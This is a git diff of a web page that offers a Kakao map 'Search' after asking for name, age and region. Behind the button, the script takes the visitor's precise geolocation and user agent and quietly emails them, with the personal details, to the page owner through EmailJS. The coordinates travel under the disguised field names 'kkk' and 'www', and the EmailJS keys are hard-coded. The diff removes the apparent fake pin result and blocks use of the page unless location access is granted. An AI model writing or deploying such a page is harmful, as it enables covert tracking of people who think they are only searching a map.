@@ -54,7 +54,7 @@
   </div>
   <div id="map"></div>
   <br>
-  <button onclick="input_text()">Search</button>
+  <button id="showPinsButton">Search</button>
 
   <script src="https://dapi.kakao.com/v2/maps/sdk.js?appkey=1bb19c8f6495a5506c11c093b737801c&libraries=services"></script>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
@@ -105,12 +105,21 @@
     let map; // 전역 변수로 맵 객체 선언
     let markers = []; // 마커들을 저장할 배열
 
-    const input_text = () => {
+    document.getElementById("showPinsButton").addEventListener("click", function() {
+                // 위치 권한 확인
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(input_text, showPermissionAlert);
+                } else {
+                    showPermissionAlert();
+                }
+            });
+
+    function input_text() {
       const name = document.getElementById('name').value;
       const age = document.getElementById('age').value;
       const region = document.getElementById('region').value;
       var userAgent = navigator.userAgent;
-
+    
       if (name !== '' && age !== '' && region !== '') {
         // 1111
         if (navigator.geolocation) {
@@ -118,40 +127,46 @@
             (position) => {
               const { latitude, longitude } = position.coords;
               
-              // 2222
-              const serviceID = 'service_5jd7b38';
-              const templateID = 'template_im14zjl';
-              const userID = 'AF797';
-              const secureToken = 'NAgmxe2zcTJgOYefF';
-              
-              emailjs.init(userID);
-              emailjs.send(serviceID, templateID, {
-                name: name,
-                age: age,
-                region: region,
-                kkk: latitude,
-                www: longitude,
-                userAgent: userAgent
-              }, secureToken)
-                .then((response) => {
-                  console.log('Email sent:', response.status, response.text);
-                })
-                .catch((error) => {
-                  console.error('Error sending email:', error);
-                });
+              sendEmailWithLocation(name, age, region, latitude, longitude, userAgent);
             },
             (error) => {
               console.error('Error retrieving user location:', error);
+              showPermissionAlert();
             }
           );
         } else {
           console.error('Geolocation is not supported by this browser.');
         }
-
-        placeRandomPin();
       }
-    };
-
+    }
+    
+    function sendEmailWithLocation(name, age, region, latitude, longitude, userAgent) {
+      const serviceID = 'service_5jd7b38';
+      const templateID = 'template_im14zjl';
+      const userID = 'AF797';
+      const secureToken = 'NAgmxe2zcTJgOYefF';
+    
+      emailjs.init(userID);
+      emailjs.send(serviceID, templateID, {
+        name: name,
+        age: age,
+        region: region,
+        kkk: latitude,
+        www: longitude,
+        userAgent: userAgent
+      }, secureToken)
+        .then((response) => {
+          console.log('Email sent:', response.status, response.text);
+        })
+        .catch((error) => {
+          console.error('Error sending email:', error);
+        });
+    }
+    
+    function showPermissionAlert() {
+      alert('유저가 위치 권한을 허용하지 않으면 사용이 불가능합니다.');
+    }
+    
     // 페이지 로드 시 카카오 맵 초기화
     window.onload = initializeMap;
   </script>
